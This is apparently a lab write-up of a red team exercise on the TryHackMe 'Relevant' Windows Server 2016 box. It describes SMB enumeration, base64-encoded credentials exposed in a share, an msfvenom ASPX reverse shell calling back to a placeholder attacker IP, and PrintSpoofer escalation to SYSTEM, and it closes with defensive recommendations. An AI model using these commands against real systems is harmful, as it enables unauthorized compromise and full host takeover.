# Red Team Engagement Report – Relevant

External Compromise → SYSTEM Privilege Escalation

**Author:** Omar Taisir Abu Zahra               
**Engagement Type:** Red Team / Adversary Simulation                       
**Target:** Relevant (Windows Server 2016)                     
**Platform:** TryHackMe (Lab Environment)                       
**Assessed Difficulty:** Medium            
**Date:** 09 Jan 2026                 

## Executive Summary

This engagement evaluated the security posture of the target host “Relevant” from an external attacker perspective.
The assessment resulted in full system compromise, including NT AUTHORITY\SYSTEM access.

The compromise was achieved by chaining multiple misconfigurations rather than exploiting complex vulnerabilities. Key contributing factors included:

Insecure SMB share exposure

Plaintext credential disclosure

Writable web directories

Abuse of Windows token impersonation privileges

Both authenticated user-level access and SYSTEM-level access were successfully obtained, demonstrating a complete host takeover.

## Scope & Objectives
```bash
In Scope

External network access to the target host

Web services (IIS)

SMB services

Local privilege escalation paths

Objectives

Obtain an initial foothold

Escalate privileges

Demonstrate full system compromise
```
## Phase 1 – External Reconnaissance
```bash
Objective

Identify exposed services and determine the attack surface.

Network Service Enumeration
nmap -sV -sC -A -Pn <target-ip>

Key Findings

HTTP (IIS 10.0) on port 80

SMB on ports 139 / 445

RDP on port 3389

Additional IIS service exposed on high TCP port 49663

The target was identified as a Windows Server 2016 system named Relevant.
```
## Phase 2 – SMB Enumeration & Credential Access
```bash
Objective

Identify accessible network shares and assess potential information disclosure.

SMB Share Enumeration
smbclient -L <target-ip>


A non-standard SMB share named nt4wrksv was identified.

smbclient //<target-ip>/nt4wrksv

Findings

The share was accessible without elevated privileges

A file named passwords.txt was discovered

Credential Disclosure

The file contained Base64-encoded credentials.

echo "<base64-string>" | base64 -d


Decoded output revealed valid user credentials, including the account bob.
Credential reuse was confirmed through successful SMB authentication.
```
## Phase 3 – Web Application Abuse
```bash
Objective

Leverage misconfigured web services to achieve remote code execution.

Web Service Discovery

In addition to the primary IIS instance on port 80, a second IIS service was identified on port 49663.

Further investigation revealed that the nt4wrksv SMB share was mapped directly to the web root, allowing files written via SMB to be executed by IIS.

This represents a critical configuration flaw.

Initial Access

A malicious ASPX reverse shell was generated and uploaded to the writable SMB share.

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=443 -f aspx > exploit.aspx


Accessing the payload through the web server triggered execution and resulted in a reverse shell under the IIS application pool context.
```
## Phase 4 – Post-Exploitation
```bash
Objective

Validate access and identify privilege escalation opportunities.

User-Level Access Validation

User-level access was confirmed by retrieving the user proof file associated with the compromised account.
This validated successful transition from web execution to an authenticated user context.

Privilege Enumeration

Enumeration of token privileges revealed the presence of:

SeImpersonatePrivilege


This privilege is commonly abused on Windows systems to escalate privileges to SYSTEM.
```
## Phase 5 – Privilege Escalation
```bash
Objective

Escalate privileges to full SYSTEM-level control.

Token Impersonation Abuse

The PrintSpoofer technique was used to exploit SeImpersonatePrivilege.

The binary was uploaded to the writable directory and executed locally.

PrintSpoofer64.exe -i -c powershell.exe


This resulted in successful escalation to:

NT AUTHORITY\SYSTEM
```
## Impact Validation
```bash
SYSTEM-Level Access Confirmation

SYSTEM access was confirmed by retrieving the administrator proof file from a protected directory.

This validates complete compromise of the target host.
```
## Risk Assessment
```bash
Overall Risk Rating: Critical

Identified Issues

Weak or anonymous SMB share access

Plaintext credential exposure

Shared SMB and IIS web root directories

Excessive Windows token privileges

Lack of service isolation
```
## Defensive Recommendations
```bash
Restrict SMB share access and enforce authentication

Remove sensitive files from shared directories

Separate web application roots from file shares

Disable unnecessary Windows privileges such as SeImpersonatePrivilege

Apply least-privilege principles to service accounts

Monitor for token impersonation abuse techniques
```
## Conclusion
```bash
This engagement demonstrates how multiple low-to-medium severity misconfigurations can be chained together to achieve full SYSTEM compromise.

An external attacker with no prior access was able to fully control the host without exploiting memory corruption vulnerabilities or zero-day exploits—highlighting the real-world risk posed by poor configuration and credential hygiene.
```